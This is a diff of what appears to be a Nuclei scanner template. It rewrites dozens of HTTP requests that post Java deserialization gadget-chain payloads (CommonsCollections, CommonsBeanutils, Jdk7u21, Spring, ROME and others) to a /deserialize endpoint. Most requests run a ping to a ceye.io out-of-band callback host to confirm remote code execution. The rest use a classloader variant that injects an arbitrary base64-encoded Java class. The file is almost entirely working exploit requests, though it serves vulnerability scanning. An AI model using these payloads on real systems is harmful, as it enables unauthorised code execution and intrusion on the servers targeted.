@@ -16,245 +16,245 @@ http:
         Content-Type: application/x-www-form-urlencoded
         gadget: BeanShell1
 
-        data={{generate_java_gadget("BeanShell1", "ping -c 1 nuclei.bs1.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("BeanShell1", "Transform", "raw_cmd", "{\"cmd\":\"ping -c 1 nuclei.bs1.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollectionsK3
 
-        data={{generate_java_gadget("CommonsCollectionsK3", "ping -c 1 nuclei.cck3.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollectionsK3", "Transform", "raw_cmd", "{\"cmd\":\"ping -c 1 nuclei.cck3.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollectionsK4
 
-        data={{generate_java_gadget("CommonsCollectionsK4", "ping -c 1 nuclei.cck4.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollectionsK4", "Transform", "raw_cmd", "{\"cmd\":\"ping -c 1 nuclei.cck4.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: Groovy1
 
-        data={{generate_java_gadget("Groovy1", "ping -c 1 nuclei.gv1.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("Groovy1", "Transform", "raw_cmd", "{\"cmd\":\"ping -c 1 nuclei.gv1.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: Click1
 
-        data={{generate_java_gadget("Click1", "ping -c 1 nuclei.ck1.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("Click1", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.ck1.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsBeanutils1
 
-        data={{generate_java_gadget("CommonsBeanutils1", "ping -c 1 nuclei.cbu1.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("CommonsBeanutils1", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cbu1.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsBeanutils1_183
 
-        data={{generate_java_gadget("CommonsBeanutils1_183", "ping -c 1 nuclei.cbu1183.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("CommonsBeanutils1_183", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cbu1183.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsBeanutils2_183
 
-        data={{generate_java_gadget("CommonsBeanutils2_183", "ping -c 1 nuclei.cbu2183.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("CommonsBeanutils2_183", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cbu2183.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsBeanutils2
 
-        data={{generate_java_gadget("CommonsBeanutils2", "ping -c 1 nuclei.cbu2.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("CommonsBeanutils2", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cbu2.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollections1
 
-        data={{generate_java_gadget("CommonsCollections1", "ping -c 1 nuclei.cc1.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollections1", "Transform", "raw_cmd", "{\"cmd\":\"ping -c 1 nuclei.cc1.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollections2
 
-        data={{generate_java_gadget("CommonsCollections2", "ping -c 1 nuclei.cc2.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollections2", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cc2.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollections3
 
-        data={{generate_java_gadget("CommonsCollections3", "ping -c 1 nuclei.cc3.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollections3", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cc3.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollections4
 
-        data={{generate_java_gadget("CommonsCollections4", "ping -c 1 nuclei.cc4.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollections4", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cc4.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollections5
 
-        data={{generate_java_gadget("CommonsCollections5", "ping -c 1 nuclei.cc5.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollections5", "Transform", "raw_cmd", "{\"cmd\":\"ping -c 1 nuclei.cc5.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollections6
 
-        data={{generate_java_gadget("CommonsCollections6", "ping -c 1 nuclei.cc6.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollections6", "Transform", "raw_cmd", "{\"cmd\":\"ping -c 1 nuclei.cc6.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollections6Lite
 
-        data={{generate_java_gadget("CommonsCollections6Lite", "ping -c 1 nuclei.cc6l.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollections6Lite", "Transform", "raw_cmd", "{\"cmd\":\"ping -c 1 nuclei.cc6l.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollections7
 
-        data={{generate_java_gadget("CommonsCollections7", "ping -c 1 nuclei.cc7.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollections7", "Transform", "raw_cmd", "{\"cmd\":\"ping -c 1 nuclei.cc7.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollections8
 
-        data={{generate_java_gadget("CommonsCollections8", "ping -c 1 nuclei.cc8.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollections8", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cc8.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollections9
 
-        data={{generate_java_gadget("CommonsCollections9", "ping -c 1 nuclei.cc9.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollections9", "Transform", "raw_cmd", "{\"cmd\":\"ping -c 1 nuclei.cc9.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollections10
 
-        data={{generate_java_gadget("CommonsCollections10", "ping -c 1 nuclei.cc10.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollections10", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cc10.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollections11
 
-        data={{generate_java_gadget("CommonsCollections11", "ping -c 1 nuclei.cc11.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollections11", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cc11.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollectionsK1
 
-        data={{generate_java_gadget("CommonsCollectionsK1", "ping -c 1 nuclei.cck1.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollectionsK1", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cck1.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollectionsK2
 
-        data={{generate_java_gadget("CommonsCollectionsK2", "ping -c 1 nuclei.cck2.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollectionsK2", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cck2.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: JBossInterceptors1
 
-        data={{generate_java_gadget("JBossInterceptors1", "ping -c 1 nuclei.jbi1.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("JBossInterceptors1", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.jbi1.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: JSON1
 
-        data={{generate_java_gadget("JSON1", "ping -c 1 nuclei.json1.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("JSON1", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.json1.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: JavassistWeld1
 
-        data={{generate_java_gadget("JavassistWeld1", "ping -c 1 nuclei.jw1.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("JavassistWeld1", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.jw1.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: jdk7u21
 
-        data={{generate_java_gadget("jdk7u21", "ping -c 1 nuclei.jdk7u21.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("Jdk7u21", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.jdk7u21.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: jdk8u20
 
-        data={{generate_java_gadget("jdk8u20", "ping -c 1 nuclei.jdk8u20.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("Jdk8u20", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.jdk8u20.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: MozillaRhino1
 
-        data={{generate_java_gadget("MozillaRhino1", "ping -c 1 nuclei.mr1.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("MozillaRhino1", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.mr1.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: MozillaRhino2
 
-        data={{generate_java_gadget("MozillaRhino2", "ping -c 1 nuclei.mr2.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("MozillaRhino2", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.mr2.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: ROME
 
-        data={{generate_java_gadget("ROME", "ping -c 1 nuclei.rome.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("ROME", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.rome.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: Hibernate1
 
-        data={{generate_java_gadget("Hibernate1", "ping -c 1 nuclei.hb1.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("Hibernate1", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.hb1.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: Spring1
 
-        data={{generate_java_gadget("Spring1", "ping -c 1 nuclei.sp1.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("Spring1", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.sp1.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: Spring2
 
-        data={{generate_java_gadget("Spring2", "ping -c 1 nuclei.sp2.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("Spring2", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.sp2.3p4u87.ceye.io\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: Vaadin1
 
-        data={{generate_java_gadget("Vaadin1", "ping -c 1 nuclei.va1.3p4u87.ceye.io", "base64")}}
+        data={{generate_java_gadget_ext("Vaadin1", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.va1.3p4u87.ceye.io\"}", "base64")}}
       # generate_java_gadget_classloader example
       - |
         POST /deserialize HTTP/1.1
@@ -262,172 +262,172 @@ http:
         Content-Type: application/x-www-form-urlencoded
         gadget: Click1 classloader
 
-        data={{generate_java_gadget_classloader("Click1", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("Click1", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsBeanutils1 classloader
 
-        data={{generate_java_gadget_classloader("CommonsBeanutils1", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("CommonsBeanutils1", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsBeanutils1_183 classloader
 
-        data={{generate_java_gadget_classloader("CommonsBeanutils1_183", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("CommonsBeanutils1_183", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsBeanutils2_183 classloader
 
-        data={{generate_java_gadget_classloader("CommonsBeanutils2_183", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("CommonsBeanutils2_183", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsBeanutils2 classloader
 
-        data={{generate_java_gadget_classloader("CommonsBeanutils2", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("CommonsBeanutils2", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollections2 classloader
 
-        data={{generate_java_gadget_classloader("CommonsCollections2", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollections2", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollections3 classloader
 
-        data={{generate_java_gadget_classloader("CommonsCollections3", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollections3", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollections4 classloader
 
-        data={{generate_java_gadget_classloader("CommonsCollections4", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollections4", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollections8 classloader
 
-        data={{generate_java_gadget_classloader("CommonsCollections8", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollections8", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollections10 classloader
 
-        data={{generate_java_gadget_classloader("CommonsCollections10", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollections10", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollections11 classloader
 
-        data={{generate_java_gadget_classloader("CommonsCollections11", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollections11", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollectionsK1 classloader
 
-        data={{generate_java_gadget_classloader("CommonsCollectionsK1", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollectionsK1", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: CommonsCollectionsK2 classloader
 
-        data={{generate_java_gadget_classloader("CommonsCollectionsK2", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("CommonsCollectionsK2", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: JBossInterceptors1 classloader
 
-        data={{generate_java_gadget_classloader("JBossInterceptors1", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("JBossInterceptors1", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: JSON1 classloader
 
-        data={{generate_java_gadget_classloader("JSON1", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("JSON1", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: JavassistWeld1 classloader
 
-        data={{generate_java_gadget_classloader("JavassistWeld1", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("JavassistWeld1", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: jdk7u21 classloader
 
-        data={{generate_java_gadget_classloader("jdk7u21", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("Jdk7u21", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: jdk8u20 classloader
 
-        data={{generate_java_gadget_classloader("jdk8u20", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("Jdk8u20", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: MozillaRhino1 classloader
 
-        data={{generate_java_gadget_classloader("MozillaRhino1", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("MozillaRhino1", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: MozillaRhino2 classloader
 
-        data={{generate_java_gadget_classloader("MozillaRhino2", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("MozillaRhino2", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: ROME classloader
 
-        data={{generate_java_gadget_classloader("ROME", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("ROME", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: Hibernate1 classloader
 
-        data={{generate_java_gadget_classloader("Hibernate1", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("Hibernate1", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: Spring1 classloader
 
-        data={{generate_java_gadget_classloader("Spring1", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("Spring1", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: Spring2 classloader
 
-        data={{generate_java_gadget_classloader("Spring2", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("Spring2", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
       - |
         POST /deserialize HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         gadget: Vaadin1 classloader
 
-        data={{generate_java_gadget_classloader("Vaadin1", "{{base64Class}}", "base64")}}
+        data={{generate_java_gadget_ext("Vaadin1", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
